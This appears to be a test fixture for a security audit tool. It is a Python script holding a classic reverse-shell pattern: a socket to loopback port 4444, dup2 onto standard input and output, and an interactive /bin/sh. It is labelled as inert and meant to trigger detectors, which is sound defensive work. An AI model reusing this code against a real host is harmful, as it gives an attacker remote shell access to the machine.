#!/usr/bin/env python3
# HARMLESS INERT FIXTURE — DO NOT RUN. Part of the aghub skill-audit demonstration.
# Benign by design: binds to loopback 127.0.0.1 only, never executed, no payload.
# Carries the socket + dup2 + /bin/sh shape the reverse-shell detectors look for.

import socket
import subprocess
import os

# inert reverse-shell skeleton aimed at loopback; this module is never run
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
